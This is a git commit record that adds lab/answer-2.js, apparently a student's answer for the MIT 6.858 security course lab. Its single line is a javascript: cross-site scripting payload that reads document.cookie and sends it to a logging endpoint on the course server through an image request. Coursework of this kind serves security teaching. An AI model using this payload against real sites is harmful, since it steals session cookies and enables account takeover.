97a794e939ff15654b946fcf09cd68964f3ce15f
Omar Thenmalai <omar.thenmalai@gmail.com>
2020-12-10 18:57:13 -0500

    push from vm

---
+++ lab/answer-2.js
@@ -0,0 +1,1 @@
+javascript:void((new Image()).src='https://css.csail.mit.edu/6.858/2020/labs/logs.php?' + 'id=cookie' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random());
